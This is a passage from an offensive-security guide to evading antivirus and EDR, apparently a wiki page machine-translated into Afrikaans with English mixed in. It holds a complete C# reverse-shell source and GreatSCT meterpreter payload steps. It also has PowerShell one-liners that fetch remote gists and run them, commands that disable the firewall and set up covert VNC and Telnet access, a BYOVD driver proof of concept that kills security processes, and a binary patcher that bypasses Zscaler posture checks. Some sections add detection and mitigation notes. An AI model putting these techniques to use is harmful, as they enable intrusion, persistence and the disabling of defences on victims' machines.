- **Fork\&Run**

Dit behels die **spawning a new sacrificial process**, die inject van jou post-exploitation malicious code in daardie nuwe process, die uitvoer van jou malicious code en, wanneer voltooi, die kill van die nuwe process. Dit het beide voordele en nadele. Die voordeel van die fork-and-run-metode is dat die uitvoering **outside** ons Beacon implant process plaasvind. Dit beteken dat as iets in ons post-exploitation-aksie verkeerd gaan of gevang word, daar 'n **much greater chance** is dat ons **implant surviving.** Die nadeel is dat jy 'n **greater chance** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor die inject van die post-exploitation malicious code **into its own process**. Op hierdie manier kan jy die skep van 'n nuwe process en die skandering deur AV vermy, maar die nadeel is dat as iets verkeerd gaan tydens die uitvoering van jou payload, daar 'n **much greater chance** is om jou **beacon te verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor C# Assembly loading, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **from PowerShell** laai, kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om malicious code uit te voer met ander tale deur die compromised machine toegang te gee tot die **interpreter environment installed on the Attacker Controlled SMB share**.

Deur toegang tot die Interpreter Binaries en die environment op die SMB share toe te laat, kan jy **execute arbitrary code in these languages within memory** van die compromised machine.

Die repo dui aan: Defender scan nog steeds die scripts, maar deur Go, Java, PHP etc. te benut het ons **more flexibility to bypass static signatures**. Toetsing met random on-obfuscated reverse shell scripts in hierdie tale het sukses bewys.

## TokenStomping

Token stomping is 'n tegniek wat 'n attacker toelaat om die access token of 'n security product soos 'n EDR of AV te **manipulate**, sodat hulle die privileges kan verminder — die process sal nie sterf nie, maar dit sal nie die permissies hê om vir malicious activities te check nie.

Om dit te voorkom, kan Windows **prevent external processes** om handles oor die tokens van security processes te kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om Chrome Remote Desktop op 'n victim se PC te deploy en dit te gebruik om dit te takeover en persistence te behou:
1. Laai af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installer stilweg op die victim uit (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop bladsy en klik next. Die wizard sal jou vra om te authorize; klik die Authorize-knoppie om voort te gaan.
4. Voer die gegewe parameter met 'n paar aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note die pin param wat toelaat om die pin te stel without using the GUI).


## Advanced Evasion

Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetry in net een stelsel in ag neem, so dit is amper onmoontlik om heeltemal onopgemerk te bly in mature omgewings.

Elke omgewing wat jy teëkom sal sy eie sterk- en swakpunte hê.

Ek raai sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) kyk om 'n voetsool in meer Advanced Evasion tegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook 'n ander goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Kyk watter dele Defender as malicious vind**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat sal **remove parts of the binary** totdat dit **finds out which part Defender** is finding as malicious en dit aan jou split.\
'n Ander hulpmiddel wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n open webdiens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows10 het alle Windows met 'n **Telnet server** gekom wat jy as administrator kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel opstart en **hardloop** dit nou:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet port** (stealth) en skakel firewall af:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die server:

- Skakel die opsie _Disable TrayIcon_ aan
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

Die **attacker** moet op sy **host** die binary `vncviewer.exe -listen 5900` uitvoer sodat dit gereed is om 'n reverse **VNC connection** te vang. Dan, binne die **victim**: start die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WARNING:** Om stealth te behou moet jy 'n paar dinge vermy

- Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal dit [die konfigurasievenster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp loop nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Die huidige defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C# obfuskeerders: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik van python vir build injectors — voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 het 'n klein konsole-hulpmiddel genaamd **Antivirus Terminator** gebruik om endpoint-beskerming uit te skakel voor die aflaai van ransomware. Die hulpmiddel bring sy **eie kwetsbare maar *gesigneerde* driver** en misbruik dit om bevoegde kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike afleidings
1. **Gesigneerde driver**: Die lêer wat na skyf gestuur word is `ServiceMouse.sys`, maar die binêre is die wettige gesigneerde driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) aangeskakel is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanuit user land toeganklik word.
3. **IOCTLs exposed by the driver**
| IOCTL code | Vermoë                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD skips user-mode protections entirely; code that executes in the kernel can open *protected* processes, terminate them, or tamper with kernel objects irrespective of PPL/PP, ELAM or other hardening features.

Opsporing / Mitigering
•  Skakel Microsoft se bloklys vir kwesbare drivers (`HVCI`, `Smart App Control`) in, sodat Windows weier om `AToolsKrnl64.sys` te laai.  
•  Monitor skeppings van nuwe *kernel* dienste en waarsku wanneer 'n driver gelaai word vanaf 'n gids wat wêreldwyd skryfbaar is of nie op die toelatingslys voorkom.  
•  Kyk uit vir user-mode handvatsels na pasgemaakte toestel-objekte gevolg deur verdagte `DeviceIoControl`-oproepe.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** pas apparaat-postuurreëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak 'n volledige omseiling moontlik:

1. Posture evaluation happens **entirely client-side** (a boolean is sent to the server).  
2. Internal RPC endpoints only validate that the connecting executable is **signed by Zscaler** (via `WinVerifyTrust`).

By **patching four signed binaries on disk** both mechanisms can be neutralised:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Na vervanging van die oorspronklike lêers en herbegin van die service-stapel:

* **Alle** posture kontroles vertoon **groen/komplyerend**.
* Ongetekende of gemodifiseerde binêre kan die named-pipe RPC-endpunte open (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer verkry onbeperkte toegang tot die interne netwerk soos gedefinieer deur die Zscaler-beleide.

Hierdie gevallestudie demonstreer hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patches verslaan kan word.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te manipuleer

Protected Process Light (PPL) dwing 'n signer/vlak-hiërargie af sodat slegs gelyk-of-hoër beskermde prosesse mekaar kan manipuleer. Aanvallend, as jy wettig 'n PPL-aktiewe binêre kan begin en sy argumente beheer, kan jy onskuldige funksionaliteit (bv. logging) omskep in 'n beperkte, PPL-gedekte skryf-primitive teen beskermde gidse wat deur AV/EDR gebruik word.

Wat veroorsaak dat 'n proses as PPL hardloop
- Die teiken EXE (en enige gelaaide DLLs) moet met 'n PPL-bekwame EKU geteken wees.
- Die proses moet geskep word met CreateProcess met die vlagte: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Kompatibele beskermingsvlak moet versoek word wat by die signer van die binêre pas (bv., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde vlakke sal by skepping misluk.

Sien ook 'n breër inleiding tot PP/PPL en LSASS-beskerming hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-gereedskap
- Oopbron-hulp: CreateProcessAsPPL (kies beskermingsvlak en stuur argumente deur na die teiken EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruikspatroon:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die ondertekende stelsel-binary `C:\Windows\System32\ClipUp.exe` skep self 'n nuwe proses en aanvaar 'n parameter om 'n loglêer na 'n deur die aanroeper gespesifiseerde pad te skryf.
- Wanneer as 'n PPL-proses gelanseer, gebeur die lêerskrywing met PPL-beskerming.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3 kortpaaie om na normaalweg beskermde plekke te wys.

8.3 short path helpers
- Lys kortname: `dir /x` in elke parent directory.
- Bepaal kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lanseer die PPL-capable LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-pad argument om 'n lêer te dwing in 'n beskermde AV directory te skep (bv. Defender Platform). Gebruik 8.3 kortname indien nodig.
3) As die teiken-binary normaalweg deur die AV oopgemaak/gesluit word terwyl dit loop (bv. MsMpEng.exe), skeduleer die skrywing by boot voordat die AV begin deur 'n auto-start diens te installeer wat betroubaar vroeër loop. Valideer boot-volgorde met Process Monitor (boot logging).
4) By herlaai gebeur die PPL-ondersteunde skrywing voordat die AV sy binêre lêers sluit, wat die teikenlêer korrupteer en opstart voorkom.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie die inhoud wat ClipUp skryf beheer buite die plasing nie; die primitief is geskik vir korrupsie eerder as presiese inhouds-inspuiting.
- Vereis lokale admin/SYSTEM om 'n diens te installeer/te begin en 'n herlaai-venster.
- Tydsberekening is kritiek: die teiken mag nie oop wees nie; uitvoering tydens opstart voorkom lêerslotte.

Opsporing
- Prosesaanmaak van `ClipUp.exe` met ongebruiklike argumente, veral met nie-standaard launchers as ouerproses, rondom opstart.
- Nuwe dienste wat gekonfigureer is om verdagte binaries outo-aan te begin en konstant voor Defender/AV te begin. Ondersoek diensskepping/wysiging voorafgaande aan Defender-opstartfoute.
- Lêer-integriteitmonitering op Defender binaries/Platform directories; onverwagte lêerskeppings/wysigings deur prosesse met protected-process-vlae.
- ETW/EDR telemetry: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale PPL-vlak gebruik deur nie-AV binaries.

Mitigering
- WDAC/Code Integrity: beperk watter gesigneerde binaries as PPL kan loop en onder watter ouerprosesse; blokkeer ClipUp-aanroepings buite legitieme kontekste.
- Dienshigiëne: beperk skepping/wysiging van outo-aan dienste en monitor beginvolgorde-manipulasie.
- Sorg dat Defender tamper protection en early-launch protections geaktiveer is; ondersoek opstartfoute wat op binary-korrupsie dui.
- Oorweeg om 8.3 kort-naam generering op volumes wat security tooling huisves te deaktiveer indien versoenbaar met jou omgewing (toets deeglik).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder te lysteer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawe-string (bv. `4.18.25070.5-0`), en start dan die Defender-diensprosesse van daar af (en werk diens-/registerpade ooreenkomstig by). Hierdie seleksie vertrou directory-insette insluitend directory reparse points (symlinks). 'n Administrator kan dit benut om Defender om te lei na 'n aanvaller-skryfbare pad en DLL sideloading of diensversteuring bereik.

Voorvereistes
- Plaaslike Administrator (benodig om gidse/symlinks te skep onder die Platform-foolder)
- Vermoë om te herbegin of Defender platform-herseleksie uit te lok (diensherbegin by opstart)
- Slegs ingeboude gereedskap benodig (mklink)

Waarom dit werk
- Defender blokkeer skrywe in sy eie gidse, maar sy platform-seleksie vertrou directory-inskrywings en kies die leksikografies hoogste weergawe sonder om te valideer dat die teiken na 'n beskermde/betroubare pad oplos.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep 'n gids-symlink vir 'n hoër weergawe binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-seleksie (herbegin aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die omgeleide pad uitgevoer word:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` te sien en die dienskonfigurasie/registry wat daardie ligging weerspieël.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs wat Defender vanaf sy toepassingsgids laai om kode in Defender se prosesse uit te voer. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Verwyder die version-symlink sodat by die volgende opstart die geconfigureerde pad nie oplos nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Let wel: Hierdie tegniek bied nie privilege escalation op sigself nie; dit vereis admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime evasion uit die C2 implant na die teikenmodule self skuif deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur attacker-controlled, position‑independent code (PIC) te stuur. Dit generaliseer evasion buite die klein API-oppervlak wat baie kits openbaar (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post‑exploitation DLLs.

Hoëvlak-benadering
- Stage a PIC blob langs die teikenmodule op met behulp van 'n reflective loader (prepended of companion). Die PIC moet self‑contained en position‑independent wees.
- Terwyl die host DLL laai, loop sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT entries vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) om na dun PIC wrappers te wys.
- Elke PIC wrapper voer evasions uit voordat dit die werklike API-adres tail‑calls. Tipiese evasions sluit in:
  - Memory mask/unmask rondom die call (bv. encrypt beacon regions, RWX→RX, verander page names/permissions) en herstel daarna.
  - Call‑stack spoofing: konstrueer 'n benign stack en skuif in die target API sodat call‑stack analysis na verwagte frames oplos.
- Vir kompatibiliteit, exporteer 'n interface sodat 'n Aggressor script (of eweknie) kan registreer watter APIs om te hook vir Beacon, BOFs en post‑ex DLLs.

Waarom IAT hooking hier
- Werk vir enige code wat die hooked import gebruik, sonder om tool code te wysig of op Beacon te staatmaak om spesifieke APIs te proxy.
- Omvat post‑ex DLLs: hooking LoadLibrary* laat jou toe om module loads (bv. System.Management.Automation.dll, clr.dll) te onderskep en dieselfde masking/stack evasion op hul API calls toe te pas.
- Herstel betroubare gebruik van process‑spawning post‑ex opdragte teen call‑stack–based detections deur CreateProcessA/W te omsluit.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Aantekeninge
- Pas die patch toe na relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens DllMain van die geladen module.
- Hou wrappers klein en PIC-safe; los die werklike API op via die oorspronklike IAT waarde wat jy voor patching vasgevang het of via LdrGetProcedureAddress.
- Gebruik RW → RX oorgange vir PIC en vermy om writable+executable pages te laat.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bou 'n vals call chain (return addresses into benign modules) en pivot dan na die werklike API.
- Dit omseil detecties wat verwag dat canonical stacks vanaf Beacon/BOFs na sensitiewe APIs sal lei.
- Kombineer met stack cutting/stack stitching tegnieke om binne verwagte frames te beland voor die API prologue.

Operationele integrasie
- Voeg die reflective loader vooraan by post‑ex DLLs sodat die PIC en hooks outomaties initialise wanneer die DLL gelaai word.
- Gebruik 'n Aggressor script om target APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde evasion path sonder kodeveranderinge.

Detection/DFIR oorwegings
- IAT integrity: entries wat resolve na non‑image (heap/anon) addresses; periodieke verifikasie van import pointers.
- Stack anomalies: return addresses wat nie tot gelaaide images behoort nie; abrupte oorgange na non‑image PIC; inkonsekwente RtlUserThreadStart ancestry.
- Loader telemetry: in‑proces writes na IAT, vroeë DllMain aktiwiteit wat import thunks wysig, onverwags RX regions geskep tydens load.
- Image‑load evasion: indien hooking LoadLibrary*, monitor verdagte loads van automation/clr assemblies wat met memory masking events korreleer.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
